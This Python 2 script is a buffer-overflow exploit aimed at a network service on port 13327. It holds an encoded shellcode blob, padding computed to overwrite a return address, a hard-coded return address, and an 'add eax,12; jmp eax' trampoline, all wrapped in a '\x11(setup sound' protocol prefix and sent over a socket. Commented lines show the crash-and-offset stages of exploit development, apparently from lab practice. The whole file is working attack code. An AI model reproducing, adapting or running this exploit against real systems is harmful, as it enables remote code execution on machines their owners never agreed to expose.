import socket


# nasm > add eax,12
# 00000000  83C00C            add eax,byte +0xc
# nasm > jmp eax
# 00000000  FFE0              jmp eax

shellcode = (
        "\xdd\xc3\xba\x88\xba\x1e\x34\xd9\x74\x24\xf4\x5f\x31\xc9" +
        "\xb1\x14\x31\x57\x19\x03\x57\x19\x83\xc7\x04\x6a\x4f\x2f" +
        "\xef\x9d\x53\x03\x4c\x32\xfe\xa6\xdb\x55\x4e\xc0\x16\x15" +
        "\xf4\x53\xfb\x7d\x09\x6c\xea\x21\x67\x7c\x5d\x89\xfe\x9d" +
        "\x37\x4f\x59\x93\x48\x06\x18\x2f\xfa\x1c\x2b\x49\x31\x9c" +
        "\x08\x26\xaf\x51\x0e\xd5\x69\x03\x30\x82\x44\x53\x07\x4b" +
        "\xaf\x3b\xb7\x84\x3c\xd3\xaf\xf5\xa0\x4a\x5e\x83\xc6\xdc" +
        "\xcd\x1a\xe9\x6c\xfa\xd1\x6a" )

host="127.0.0.1" 
ret="\x97\x45\x13\x08"

#crash="\x41" * 4368 + "\x42" * 4 + "\x83\xC0\x0C\xFF\xE0" +  "\x90\x90"
crash= shellcode + "\x41" * (4368-105) + ret + "\x83\xC0\x0C\xFF\xE0" +  "\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"
# buffer = "\x11(setup sound " + uniquestring + "\x90\x00#"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent!"
